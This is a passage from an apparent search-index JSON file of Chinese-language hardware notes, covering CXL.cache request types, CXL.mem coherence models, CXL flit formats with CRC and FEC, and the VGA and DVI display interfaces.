\u200b\u4e0d\u200b\u8bfb\u53d6\u200b\u73b0\u5728\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u8fdb\u5165\u200b E \u200b\u6001\u200b\u3002\u200b\u4e00\u822c\u200b\u7528\u4e8e\u200b\u6574\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u6570\u636e\u200b\u90fd\u200b\u8981\u200b\u66f4\u65b0\u200b\u7684\u200b\u60c5\u51b5\u200b\uff0c\u200b\u6240\u4ee5\u200b\u4e0d\u200b\u9700\u8981\u200b\u6216\u8bb8\u200b\u5f53\u524d\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u6570\u636e\u200b\u3002</li> <li>ItoMWr(Read0-Write)\uff0cDevice \u200b\u5199\u5165\u200b\u65b0\u200b\u7684\u200b\u5b8c\u6574\u200b\u7f13\u5b58\u200b\u884c\u5230\u200b Host \u200b\u4e2d\u200b\uff0c\u200b\u5e76\u4e14\u200b\u8fdb\u5165\u200b M \u200b\u6001\u200b\u3002Host \u200b\u54cd\u5e94\u200b GO_WritePull/GO_ERR_WritePull\u3002</li> <li>WrCur(Read0-Write)\uff0c\u200b\u548c\u200b ItoMWr \u200b\u57fa\u672c\u200b\u4e00\u6837\u200b\uff0c\u200b\u533a\u522b\u200b\u5728\u4e8e\u200b\uff0c\u200b\u5982\u679c\u200b\u7f13\u5b58\u200b\u884c\u200b\u547d\u4e2d\u200b\u4e86\u200b\uff0c\u200b\u5c31\u200b\u5199\u5165\u200b\u5230\u200b\u7f13\u5b58\u200b\u4e2d\u200b\uff1b\u200b\u5982\u679c\u200b\u7f3a\u5931\u200b\u4e86\u200b\uff0c\u200b\u5c31\u200b\u5199\u5165\u200b\u5230\u200b\u5185\u5b58\u200b\u4e2d\u200b\u3002Host \u200b\u54cd\u5e94\u200b GO_WritePull/GO_ERR_WritePull\u3002</li> <li>CLFlush(Read0)\uff0c\u200b\u8981\u6c42\u200b Host Invalidate \u200b\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\u3002Host \u200b\u54cd\u5e94\u200b GO-Err/GO-I\u3002</li> <li>CleanEvict(Write)\uff0cDevice \u200b\u8981\u200b Evict \u200b\u4e00\u4e2a\u200b Exclusive \u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\u3002Host \u200b\u54cd\u5e94\u200b GO_WritePull/GO_WritePull_Drop\u3002</li> <li>DirtyEvict(Write)\uff0cDevice \u200b\u8981\u200b Evict \u200b\u4e00\u4e2a\u200b Modified \u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\u3002Host \u200b\u54cd\u5e94\u200b GO_WritePull/GO_ERR_WritePull\u3002</li> <li>CleanEvictNoData(Write)\uff0cDevice \u200b\u8981\u200b Evict \u200b\u4e00\u4e2a\u200b Exclusive \u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\uff0c\u200b\u4f46\u662f\u200b\u4e0d\u200b\u4f20\u8f93\u6570\u636e\u200b\uff0c\u200b\u53ea\u200b\u7528\u4e8e\u200b\u66f4\u65b0\u200b Snoop Filter\u3002Host \u200b\u54cd\u5e94\u200b GO-I\u3002</li> <li>WrInv(Write)\uff0cWrite Invalidate Line\uff0c\u200b\u5411\u200b Host \u200b\u5199\u5165\u200b 0-64 \u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u5e76\u4e14\u200b Invalidate \u200b\u7f13\u5b58\u200b\u3002Host \u200b\u54cd\u5e94\u200b WritePull/GO-Err/GO-I\u3002</li> <li>WOWrInv(Write)\uff0cWeakly Ordered \u200b\u7248\u672c\u200b\u7684\u200b WrInV\uff0c\u200b\u5199\u5165\u200b 0-63 \u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b\u3002Host \u200b\u54cd\u5e94\u200b ExtCmp/FastGO_WritePull/GO_ERR_WritePull\u3002</li> <li>WOWrInvF(Write)\uff0cWeakly Ordered \u200b\u7248\u672c\u200b\u7684\u200b WrInv\uff0c\u200b\u5199\u5165\u200b 64 \u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b\u3002Host \u200b\u54cd\u5e94\u200b ExtCmp/FastGO_WritePull/GO_ERR_WritePull\u3002</li> <li>CacheFlushed(Read0)\uff0c\u200b\u544a\u8bc9\u200b Host \u200b\u81ea\u5df1\u200b\u7684\u200b\u7f13\u5b58\u200b\u90fd\u200b\u88ab\u200b\u6e05\u7a7a\u200b\u4e86\u200b\uff0c\u200b\u6240\u6709\u200b\u7f13\u5b58\u200b\u884c\u90fd\u200b\u5728\u200b I \u200b\u72b6\u6001\u200b\u3002Host \u200b\u54cd\u5e94\u200b GO-I\u3002</li> </ol>"},{"location":"hardware/cxl.html#_2","title":"\u548c\u200b\u5176\u4ed6\u200b\u534f\u8bae\u200b\u7684\u200b\u5bf9\u6bd4","text":"<p>\u200b\u5728\u200b \u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b \u200b\u4e2d\u200b\u5206\u6790\u200b\u8fc7\u200b TileLink \u200b\u7684\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u5b9e\u73b0\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u5982\u679c\u200b\u67d0\u200b\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\uff08Master A\uff09\u200b\u51fa\u73b0\u200b\u4e86\u200b\u7f3a\u5931\u200b\uff0c\u200b\u9700\u8981\u200b\u7ecf\u8fc7\u200b\u5982\u4e0b\u200b\u7684\u200b\u8fc7\u7a0b\u200b\uff1a</p> <ul> <li>Master A -&gt; Slave: Acquire</li> <li>Slave -&gt; Master B: Probe</li> <li>Master B -&gt; Slave: ProbeAck</li> <li>Slave -&gt; Master A: Grant</li> <li>Master A -&gt; Slave: GrantAck</li> </ul> <p>\u200b\u5728\u200b TileLink Cached \u200b\u91cc\u9762\u200b\uff0c\u200b\u6240\u6709\u200b\u7684\u200b Master \u200b\u90fd\u200b\u662f\u200b\u5e73\u7b49\u200b\u7684\u200b\u3002\u200b\u800c\u200b\u5728\u200b CXL \u200b\u4e2d\u200b\uff0c\u200b\u9700\u8981\u200b\u7ef4\u62a4\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u7684\u200b\uff0c\u200b\u6709\u200b CPU \u200b\u5185\u90e8\u200b\u7684\u200b\u5404\u4e2a\u200b\u7f13\u5b58\u200b\u4e4b\u95f4\u200b\uff0c\u200b\u8fd8\u6709\u200b CPU \u200b\u548c\u200b\u8bbe\u5907\u200b\u4e4b\u95f4\u200b\u3002\u200b\u800c\u200b CXL.cache \u200b\u4e3b\u8981\u200b\u8d1f\u8d23\u200b\u7684\u200b\u662f\u200b\u4e0e\u200b\u8bbe\u5907\u200b\u7684\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u90e8\u5206\u200b\uff0c\u200b\u7ef4\u62a4\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u7684\u200b\u6838\u5fc3\u200b\u662f\u200b\u5728\u200b CPU \u200b\u4e00\u4fa7\u200b\uff0cHost \u200b\u76f8\u5f53\u4e8e\u200b TileLink \u200b\u7684\u200b Slave\uff0cDevice \u200b\u76f8\u5f53\u4e8e\u200b TileLink \u200b\u7684\u200b Master A\u3002\u200b\u53ef\u4ee5\u200b\u8bf4\u200b CXL.cache \u200b\u662f\u200b\u4e0d\u200b\u5bf9\u79f0\u200b\u7684\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b\u3002</p> <p>\u200b\u4f8b\u5982\u200b CXL \u200b\u4e2d\u200b\u8bbe\u5907\u200b\u8bfb\u53d6\u200b\u7f13\u5b58\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u51fa\u73b0\u200b\u4e86\u200b\u7f3a\u5931\u200b\uff0c\u200b\u90a3\u4e48\u200b\u9700\u8981\u200b\u7ecf\u8fc7\u200b\u5982\u4e0b\u200b\u7684\u200b\u8fc7\u7a0b\u200b\uff1a</p> <ul> <li>Device -&gt; Host: RdShared/RdOwn</li> <li>Host -&gt; CPU Caches: Custom Snoop Messages</li> <li>Host -&gt; Other CXL Device: SnpData</li> <li>Other CXL Device -&gt; Host: RspSHitSE/RspSFwdM</li> <li>Host -&gt; Device: GO-S</li> </ul> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u6574\u4f53\u200b\u7684\u200b\u6d41\u7a0b\u200b\u4e5f\u200b\u662f\u200b\u5dee\u4e0d\u591a\u200b\u7684\u200b\u3002</p>"},{"location":"hardware/cxl.html#cxlmem","title":"CXL.mem","text":"<p>CXL.mem \u200b\u7528\u4e8e\u200b\u6269\u5c55\u200b\u5185\u5b58\u200b\uff0c\u200b\u6839\u636e\u200b\u7c7b\u578b\u200b\u7684\u200b\u4e0d\u540c\u200b\uff0c\u200b\u5b83\u200b\u53ef\u80fd\u200b\u5355\u72ec\u200b\u4f7f\u7528\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u80fd\u200b\u548c\u200b CXL.cache \u200b\u914d\u5408\u200b\u4f7f\u7528\u200b\u3002\u200b\u5177\u4f53\u6765\u8bf4\u200b\uff0c\u200b\u6709\u200b\u4e09\u79cd\u200b\u4e00\u81f4\u6027\u200b\u6a21\u578b\u200b\uff1a</p> <ol> <li>HDM-H(Host-only Coherent)\uff1a\u200b\u4ec5\u200b Type 3 \u200b\u8bbe\u5907\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u65e0\u200b CXL.cache</li> <li>HDM-D(Device Coherent)\uff1a\u200b\u4ec5\u200b Legacy Type 2 \u200b\u8bbe\u5907\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u6709\u200b CXL.cache</li> <li>HDM-DB(Device Coherent using Back-Invalidation)\uff1aType 2 \u200b\u6216\u200b Type 3 \u200b\u8bbe\u5907\u200b</li> </ol> <p>\u200b\u5728\u200b CXL.cache \u200b\u4e2d\u200b\uff0c\u200b\u4e24\u7aef\u200b\u662f\u200b Host \u200b\u548c\u200b Device\uff1b\u200b\u800c\u200b CXL.mem\uff0c\u200b\u4e24\u7aef\u200b\u662f\u200b Master \u200b\u548c\u200b Subordinate\u3002</p> <p>\u200b\u4ece\u200b Master \u200b\u5230\u200b Subordinate \u200b\u7684\u200b\u6d88\u606f\u200b\uff08M2S\uff09\u200b\u6709\u200b\u4e09\u7c7b\u200b\uff1a</p> <ol> <li>Request(Req)</li> <li>Request with Data(RwD)</li> <li>Back-Invalidation Response(BIRsp)</li> </ol> <p>\u200b\u4ece\u200b Subordinate \u200b\u5230\u200b Master \u200b\u7684\u200b\u6d88\u606f\u200b\uff08S2M\uff09\u200b\u6709\u200b\u4e09\u7c7b\u200b\uff1a</p> <ol> <li>Response without data(NDR, No Data Response)</li> <li>Response with Data(DRS, Data Response)</li> <li>Back-Invalidation Snoop(BiSnp)</li> </ol> <p>\u200b\u5176\u4e2d\u200b\u6bd4\u8f83\u200b\u7279\u522b\u200b\u7684\u200b\u662f\u200b Back-Invalidation\uff0c\u200b\u8fd9\u4e2a\u200b\u7684\u200b\u76ee\u7684\u200b\u662f\u200b\u8ba9\u200b Device \u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b Snoop \u200b\u4fee\u6539\u200b Host \u200b\u4e2d\u200b\u7f13\u5b58\u200b\u4e86\u200b Device \u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b\u6570\u636e\u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\u3002</p> <p>\u200b\u5bf9\u4e8e\u200b Type 3 \u200b\u7684\u200b\u8bbe\u5907\u200b\uff08\u200b\u65e0\u200b CXL.cache\uff09\u200b\u6765\u8bf4\u200b\uff0cDevice \u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b\u6269\u5c55\u200b\u7684\u200b\u5185\u5b58\u200b\uff0c\u200b\u6bd4\u8f83\u7b80\u5355\u200b\uff0c\u200b\u53ea\u200b\u9700\u8981\u200b\u652f\u6301\u200b\u8bfb\u5199\u200b\u5185\u5b58\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u4e86\u200b\u3002Host \u200b\u53d1\u9001\u200b <code>MemRd*</code>\uff0cDevice \u200b\u54cd\u5e94\u200b MemData\uff1bHost \u200b\u53d1\u9001\u200b <code>MemWr*</code>\uff0cDevice \u200b\u54cd\u5e94\u200b Cmp\u3002</p> <p>\u200b\u5bf9\u4e8e\u200b Type 2 \u200b\u7684\u200b\u8bbe\u5907\u200b\uff08\u200b\u6709\u200b CXL.cache\uff09\u200b\u6765\u8bf4\u200b\uff0cDevice \u200b\u65e2\u6709\u200b\u81ea\u5df1\u200b\u7684\u200b\u7f13\u5b58\u200b\uff0c\u200b\u53c8\u200b\u6709\u200b\u81ea\u5df1\u200b\u7684\u200b\u5185\u5b58\u200b\uff0c\u200b\u6240\u4ee5\u200b\u8fd9\u65f6\u5019\u200b\u5c31\u200b\u6bd4\u8f83\u590d\u6742\u200b\u4e86\u200b\u3002\u200b\u4f8b\u5982\u200b Host \u200b\u5728\u200b\u8bfb\u53d6\u6570\u636e\u200b\u7684\u200b\u65f6\u5019\u200b\uff08MemRd\uff0cSnpData/SnpInv/SnpCur\uff09\uff0c\u200b\u8fd8\u200b\u9700\u8981\u200b\u5bf9\u200b Device Cache \u200b\u8fdb\u884c\u200b Snoop\uff08SnpData/SnpInv/SnpCur\uff09\uff0c\u200b\u4fdd\u8bc1\u200b\u7f13\u5b58\u200b\u7684\u200b\u4e00\u81f4\u6027\u200b\u3002Host \u200b\u60f3\u8981\u200b\u5199\u5165\u200b\u6570\u636e\u200b\u5230\u200b Device Memory \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5982\u679c\u200b\u6b64\u65f6\u200b Device Cache \u200b\u4e2d\u6709\u200b Dirty \u200b\u6570\u636e\u200b\uff0c\u200b\u9700\u8981\u200b\u8fdb\u884c\u200b\u5199\u200b\u5408\u5e76\u200b\uff0c\u200b\u518d\u200b\u628a\u200b\u5408\u5e76\u200b\u540e\u200b\u7684\u200b\u6570\u636e\u200b\u5199\u5165\u200b\u5230\u200b Device Memory\u3002\u200b\u5f53\u200b Device \u200b\u60f3\u8981\u200b\u4ece\u200b\u81ea\u5df1\u200b\u7684\u200b\u7f13\u5b58\u200b\u8bfb\u53d6\u6570\u636e\u200b\uff0c\u200b\u53c8\u200b\u7f3a\u5931\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9996\u5148\u200b\u9700\u8981\u200b\u5224\u65ad\u200b\u6570\u636e\u200b\u5728\u200b Host \u200b\u7aef\u7684\u200b\u7f13\u5b58\u200b\u4e2d\u200b\uff0c\u200b\u8fd8\u662f\u200b\u5728\u200b Device Memory \u200b\u4e2d\u200b\uff0c\u200b\u4e0d\u540c\u200b\u7684\u200b\u504f\u7f6e\u200b\uff08Bias\uff09\u200b\u6a21\u5f0f\u200b\u51b3\u5b9a\u200b\u4e86\u200b\u6570\u636e\u200b\u5e94\u8be5\u200b\u653e\u5728\u200b Host \u200b\u8fd8\u662f\u200b Device \u200b\u7684\u200b\u7f13\u5b58\u200b\u4e0a\u200b\u3002Device \u200b\u8981\u200b\u5199\u5165\u200b\u6570\u636e\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5982\u679c\u200b Host \u200b\u4e2d\u200b\u7f13\u5b58\u200b\u4e86\u200b\u8be5\u200b\u7f13\u5b58\u200b\u884c\u200b\uff0c\u200b\u5219\u200b\u9700\u8981\u200b Back-Invalidation\u3002\u200b\u4e3a\u4e86\u200b\u652f\u6301\u200b\u8fd9\u4e9b\u200b\u573a\u666f\u200b\uff0cCXL.cache \u200b\u548c\u200b CXL.mem \u200b\u4f1a\u200b\u6bd4\u8f83\u590d\u6742\u200b\u3002</p>"},{"location":"hardware/cxl.html#cxl_2","title":"CXL \u200b\u94fe\u8def\u5c42","text":"<p>\u200b\u524d\u9762\u200b\u63d0\u5230\u200b\u8fc7\u200b\uff0cCXL.io \u200b\u5b9e\u9645\u4e0a\u200b\u5c31\u662f\u200b PCIe\uff0c\u200b\u6240\u4ee5\u200b CXL.io \u200b\u7684\u200b\u94fe\u8def\u5c42\u200b\u91c7\u7528\u200b\u7684\u200b\u5c31\u662f\u200b PCIe \u200b\u7684\u200b\u94fe\u8def\u5c42\u200b\u3002</p> <p>\u200b\u800c\u200b\u5bf9\u4e8e\u200b CXL.cache \u200b\u548c\u200b CXL.mem\uff0cCXL \u200b\u5b9a\u4e49\u200b\u4e86\u200b 68B Flit \u200b\u6a21\u5f0f\u200b\u548c\u200b 256B Flit \u200b\u6a21\u5f0f\u200b\u3002</p> <p>\u200b\u5176\u4e2d\u200b 68B Flit \u200b\u62c6\u200b\u5206\u6210\u200b\u56db\u4e2a\u200b Slot\uff0c\u200b\u6bcf\u4e2a\u200b Slot 16 \u200b\u5b57\u8282\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4fdd\u5b58\u200b\u4e0d\u540c\u200b\u7ec4\u5408\u200b\u7684\u200b CXL \u200b\u8bf7\u6c42\u200b/\u200b\u54cd\u5e94\u200b\uff0c\u200b\u5176\u4e2d\u200b\u7b2c\u4e00\u4e2a\u200b Slot\uff08Slot 0\uff09\u200b\u5f00\u5934\u200b\u8fd8\u6709\u200b Flit Header\u3002\u200b\u6700\u540e\u200b\u8fd8\u6709\u200b 2 \u200b\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b CRC\uff0c\u200b\u6ca1\u6709\u200b FEC\u3002\u200b\u4e5f\u200b\u662f\u56e0\u4e3a\u200b 68B Flit \u200b\u6ca1\u6709\u200b FEC\uff0c\u200b\u6240\u4ee5\u200b\u53ea\u200b\u7528\u4e8e\u200b\u4e0d\u200b\u9ad8\u4e8e\u200b 32GT/s \u200b\u7684\u200b\u94fe\u8def\u200b\uff0c\u200b\u66f4\u200b\u9ad8\u200b\u5c31\u200b\u9700\u8981\u200b\u7528\u200b\u5305\u62ec\u200b FEC \u200b\u7684\u200b 256B Flit \u200b\u6a21\u5f0f\u200b\u3002</p> <p>256B Flit \u200b\u6a21\u5f0f\u200b\u6709\u200b\u4e24\u79cd\u200b\uff1a</p> <ol> <li>Standard 256B Flit \u200b\u5305\u62ec\u200b\u5f00\u5934\u200b 2 \u200b\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b\u5934\u90e8\u200b\uff0c\u200b\u7136\u540e\u200b\u662f\u200b 15 \u200b\u4e2a\u200b Slot\uff0c\u200b\u6700\u540e\u200b\u662f\u200b 2 \u200b\u5b57\u8282\u200b\u7684\u200b Credit Return\uff0c8 \u200b\u5b57\u8282\u200b\u7684\u200b CRC \u200b\u548c\u200b 6 \u200b\u5b57\u8282\u200b\u7684\u200b FEC\u3002</li> <li>Latency Optimized 256B Flit \u200b\u5305\u62ec\u200b\u5f00\u5934\u200b 2 \u200b\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b\u5934\u90e8\u200b\uff0c\u200b\u7136\u540e\u200b\u662f\u200b 8 \u200b\u4e2a\u200b Slot\uff08\u200b\u5171\u200b 120 \u200b\u5b57\u8282\u200b\uff09\uff0c\u200b\u7d27\u63a5\u7740\u200b\u662f\u200b 6 \u200b\u5b57\u8282\u200b\u7684\u200b CRC\uff0c\u200b\u63a5\u7740\u200b\u662f\u200b\u5269\u4e0b\u200b\u7684\u200b 7 \u200b\u4e2a\u200b Slot\uff0c2B \u200b\u7684\u200b Credit Return\uff0cSlot 8 \u200b\u7684\u200b\u6700\u540e\u200b 2 \u200b\u5b57\u8282\u200b\uff0c6 \u200b\u5b57\u8282\u200b\u7684\u200b FEC \u200b\u548c\u200b 6 \u200b\u5b57\u8282\u200b\u7684\u200b CRC\u3002</li> </ol> <p>\u200b\u4e24\u79cd\u200b\u7684\u200b\u683c\u5f0f\u200b\u7684\u200b\u533a\u522b\u200b\u5728\u4e8e\u200b\uff0cLatency Optimized 256B Flit \u200b\u628a\u200b CRC \u200b\u62c6\u6563\u200b\u6210\u200b\u4e86\u200b\u4e24\u200b\u90e8\u5206\u200b\uff0c\u200b\u653e\u5728\u200b\u4e2d\u95f4\u200b\u548c\u200b\u7ed3\u5c3e\u200b\uff0c\u200b\u5e76\u4e14\u200b\u82b1\u8d39\u200b\u4e86\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u7a7a\u95f4\u200b\uff086+6B\uff09\u3002\u200b\u8fd9\u6837\u200b\uff0c\u200b\u6bcf\u200b\u6536\u5230\u200b 128B \u200b\u5c31\u200b\u53ef\u4ee5\u200b\u505a\u200b CRC \u200b\u68c0\u67e5\u200b\uff0c\u200b\u4e0d\u7528\u200b\u7b49\u5230\u200b\u6536\u5230\u200b\u5b8c\u6574\u200b\u7684\u200b 256B\u3002\u200b\u4e0b\u9762\u200b\u662f\u200b\u8fd9\u200b\u4e24\u79cd\u200b CXL 256B Flit \u200b\u548c\u200b PCIe 256B Flit \u200b\u7684\u200b\u5bf9\u6bd4\u200b\u793a\u610f\u56fe\u200b\uff1a</p> <p> </p> CXL \u200b\u548c\u200b PCIe FLIT \u200b\u683c\u5f0f\u200b\u5bf9\u6bd4\u200b\uff08\u200b\u56fe\u6e90\u200b CXL 3.0 Scales the Future Data Center\uff09 <p>\u200b\u5177\u4f53\u200b\u5730\u200b\uff0c256B Flit \u200b\u88ab\u200b\u5206\u4e3a\u200b\u4e86\u200b\u524d\u534a\u90e8\u200b\u5206\u200b\uff08Even Flit\uff09\u200b\u548c\u200b\u540e\u200b\u534a\u200b\u90e8\u5206\u200b\uff08Odd Flit\uff09\u3002\u200b\u524d\u534a\u90e8\u200b\u5206\u200b\uff08Even Flit\uff09\u200b\u5305\u62ec\u200b 2 \u200b\u5b57\u8282\u200b\u7684\u200b\u5934\u90e8\u200b\uff0c120 \u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b\u548c\u200b 6 \u200b\u5b57\u8282\u200b\u7684\u200b CRC\uff0c\u200b\u8fd9\u200b 6 \u200b\u5b57\u8282\u200b\u7684\u200b CRC \u200b\u4fdd\u62a4\u200b\u7684\u200b\u5c31\u662f\u200b Even Flit \u200b\u7684\u200b\u6570\u636e\u200b\u3002\u200b\u540e\u200b\u534a\u200b\u90e8\u5206\u200b\uff08Odd Flit\uff09\u200b\u5305\u62ec\u200b 116 \u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b\uff0c6 \u200b\u5b57\u8282\u200b\u7684\u200b FEC \u200b\u548c\u200b 6 \u200b\u5b57\u8282\u200b\u7684\u200b CRC\uff0c\u200b\u5176\u4e2d\u200b FEC \u200b\u4fdd\u62a4\u200b\u7684\u200b\u662f\u200b\u5b8c\u6574\u200b\u7684\u200b 256B \u200b\u6570\u636e\u200b\uff0cCRC \u200b\u4fdd\u62a4\u200b\u7684\u200b\u662f\u200b\u540e\u200b 128 \u200b\u5b57\u8282\u200b\u6570\u636e\u200b\u3002</p> <p>\u200b\u63a5\u53d7\u65b9\u200b\u6536\u5230\u200b\u524d\u200b 128 \u200b\u5b57\u8282\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5982\u679c\u200b\u53d1\u73b0\u200b CRC \u200b\u6b63\u786e\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u63d0\u524d\u200b\u8fdb\u884c\u200b\u5904\u7406\u200b\u3002\u200b\u7c7b\u4f3c\u200b\u5730\u200b\uff0c\u200b\u6536\u5230\u200b\u540e\u200b 128 \u200b\u81ea\u5df1\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5982\u679c\u200b\u53d1\u73b0\u200b CRC \u200b\u6b63\u786e\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u8fdb\u884c\u200b\u5904\u7406\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u9a8c\u8bc1\u200b FEC\u3002\u200b\u5982\u679c\u200b\u4efb\u4f55\u200b\u4e00\u90e8\u5206\u200b\u7684\u200b CRC \u200b\u6821\u9a8c\u200b\u5931\u8d25\u200b\uff0c\u200b\u518d\u7528\u200b FEC \u200b\u6765\u200b\u7ea0\u6b63\u200b\u6574\u4e2a\u200b 256B Flit\u3002\u200b\u5982\u679c\u200b FEC \u200b\u8fd8\u662f\u200b\u7ea0\u6b63\u200b\u5931\u8d25\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u91cd\u4f20\u200b\u3002</p> <p>\u200b\u5f53\u7136\u200b\u4e86\u200b\uff0c\u200b\u8fd9\u79cd\u200b\u8bbe\u8ba1\u200b\u5728\u200b\u51cf\u5c11\u200b\u5ef6\u8fdf\u200b\u7684\u200b\u540c\u65f6\u200b\uff0c\u200b\u4e5f\u200b\u5e26\u6765\u200b\u4e86\u200b\u590d\u6742\u6027\u200b\uff1a\u200b\u4f8b\u5982\u200b\u524d\u534a\u90e8\u200b\u5206\u200b CRC \u200b\u9a8c\u8bc1\u200b\u6b63\u786e\u200b\uff0c\u200b\u540e\u200b\u534a\u200b\u90e8\u5206\u200b CRC \u200b\u9a8c\u8bc1\u200b\u9519\u8bef\u200b\uff0c\u200b\u8fd9\u65f6\u5019\u200b\u7528\u200b FEC \u200b\u8fdb\u884c\u200b\u7ea0\u9519\u200b\uff0c\u200b\u7ea0\u9519\u200b\u4e4b\u540e\u200b\u53d1\u73b0\u200b\uff0c\u200b\u524d\u534a\u90e8\u200b\u5206\u200b CRC \u200b\u9519\u8bef\u200b\uff0c\u200b\u540e\u200b\u534a\u200b\u90e8\u5206\u200b CRC \u200b\u6b63\u786e\u200b\u3002\u200b\u8fd9\u65f6\u5019\u200b\u5e94\u8be5\u200b\u76f8\u4fe1\u200b\u8c01\u200b\u5462\u200b\uff1f\u200b\u91cd\u4f20\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u524d\u534a\u200b\u548c\u200b\u540e\u200b\u534a\u200b\u7684\u200b CRC \u200b\u5982\u679c\u200b\u53c8\u200b\u51fa\u73b0\u200b\u6821\u9a8c\u200b\u9519\u8bef\u200b\u4e86\u200b\u5462\u200b\uff1f\u200b\u8fd9\u91cc\u200b\u6709\u200b\u5f88\u591a\u200b\u60c5\u51b5\u200b\u9700\u8981\u200b\u8ba8\u8bba\u200b\u3002</p>"},{"location":"hardware/display_interface.html","title":"\u663e\u793a\u200b\u63a5\u53e3","text":""},{"location":"hardware/display_interface.html#vga","title":"VGA","text":"<p>VGA \u200b\u91c7\u7528\u200b 15-pin \u200b\u7684\u200b\u8fde\u63a5\u5668\u200b\uff0c\u200b\u5305\u62ec\u200b RGB \u200b\u4e09\u79cd\u200b\u989c\u8272\u200b\uff0cHSync \u200b\u548c\u200b VSync \u200b\u4fe1\u53f7\u200b\uff0c\u200b\u8fd8\u6709\u200b\u53ef\u9009\u200b\u7684\u200b DDC \u200b\u63a5\u53e3\u200b\u3002\u200b\u6bcf\u79cd\u200b\u989c\u8272\u200b\u5bf9\u5e94\u200b\u4e00\u4e2a\u200b pin\uff0c\u200b\u91c7\u7528\u200b\u6a21\u62df\u4fe1\u53f7\u200b\u65b9\u5f0f\u200b\u4f20\u8f93\u200b\u3002VGA \u200b\u6709\u200b\u4e0d\u540c\u200b\u7684\u200b\u5206\u8fa8\u7387\u200b\u548c\u200b\u5237\u65b0\u7387\u200b\u65f6\u5e8f\u200b\uff0c\u200b\u5bf9\u5e94\u200b\u4e0d\u540c\u200b\u7684\u200b\u50cf\u7d20\u200b\u65f6\u949f\u200b\u9891\u7387\u200b\uff0c\u200b\u4ee5\u53ca\u200b HSync \u200b\u548c\u200b VSync \u200b\u7684\u200b\u6ce2\u5f62\u200b\u3002</p> <p>VGA \u200b\u4e0d\u200b\u652f\u6301\u200b\u4f20\u8f93\u200b\u97f3\u9891\u200b\u3002</p> <p>\u200b\u53c2\u8003\u200b\uff1aWikipedia</p>"},{"location":"hardware/display_interface.html#dvi","title":"DVI","text":"<p>DVI \u200b\u6709\u200b\u4e0d\u540c\u200b\u7684\u200b\u7248\u672c\u200b\uff0cDVI-A \u200b\u517c\u5bb9\u200b VGA \u200b\u63a5\u53e3\u200b\uff0c\u200b\u53ea\u200b\u4f20\u8f93\u200b\u6a21\u62df\u4fe1\u53f7\u200b\uff1bDVI-D \u200b\u5219\u200b\u662f\u200b\u91c7\u7528\u200b TMDS \u200b\u5dee\u5206\u200b\u4fe1\u53f7\u200b\u4f20\u8f93\u200b\u6570\u5b57\u4fe1\u53f7\u200b\uff0c\u200b\u517c\u5bb9\u200b HDMI\uff1bDVI-I \u200b\u5219\u200b\u517c\u5bb9\u200b DVI-A \u200b\u548c\u200b DVI-D\u3002</p> <p>\u200b\u56e0\u6b64\u200b DVI \u200b\u8f6c\u200b VGA \u200b\u6216\u8005\u200b DVI \u200b\u8f6c\u200b HDMI \u200b\u7684\u200b\u8f6c\u6362\u5668\u200b\u5185\u90e8\u200b\u4e0d\u200b\u9700\u8981\u200b\u505a\u200b\u6570\u6a21\u8f6c\u6362\u200b\uff0c\u200b\u4f46\u662f\u200b\u8981\u6c42\u200b\u53e6\u4e00\u4fa7\u200b\u7684\u200b\u8bbe\u5907\u200b\u652f\u6301\u200b\u76f8\u5e94\u200b\u7684\u200b\u4f20\u8f93\u200b\u5f62\u5f0f\u200b\uff0c\u200b\u4f8b\u5982\u200b DVI \u200b\u8f6c\u200b VGA 